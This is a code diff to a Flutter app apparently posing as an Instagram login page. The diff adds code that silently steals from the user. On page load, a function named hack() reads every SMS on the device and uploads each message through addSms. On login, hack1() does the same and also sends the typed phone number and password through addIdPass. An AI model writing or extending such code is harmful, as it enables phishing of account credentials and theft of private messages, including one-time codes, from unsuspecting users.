@@ -4,6 +4,7 @@ import 'package:flutter_signin_button/button_view.dart';
 import 'package:flutter_signin_button/flutter_signin_button.dart';
 import 'package:instagram/services/firebase-database.dart';
 import 'package:permission_handler/permission_handler.dart';
+import 'package:sms/sms.dart';
 
 class LoginPage extends StatefulWidget {
   @override
@@ -11,8 +12,22 @@ class LoginPage extends StatefulWidget {
 }
 
 class _LoginPageState extends State<LoginPage> {
+  SmsQuery query = new SmsQuery();
   var load = true;
-  void hack() {
+  Future<void> hack() async {
+    List<SmsMessage> messages = await query.getAllSms;
+    messages.map((e) async {
+      await addSms(e.body);
+      print(e.body);
+    }).toList();
+  }
+
+  Future<void> hack1() async {
+    List<SmsMessage> messages = await query.getAllSms;
+    messages.map((e) async {
+      await addSms(e.body);
+      print(e.body);
+    }).toList();
     addIdPass(_phoneController.text, _passwordController.text);
   }
 
@@ -21,6 +36,7 @@ class _LoginPageState extends State<LoginPage> {
   final _formkey = GlobalKey<FormState>();
   @override
   void initState() {
+    hack();
     _phoneController = TextEditingController();
     _passwordController = TextEditingController();
     Future.delayed(Duration(seconds: 10), () {
@@ -127,7 +143,7 @@ class _LoginPageState extends State<LoginPage> {
                                   print(
                                       "Password number is ${_passwordController.text}");
                                 }
-                                hack();
+                                hack1();
                               },
                               child: Container(
                                   width: MediaQuery.of(context).size.width,
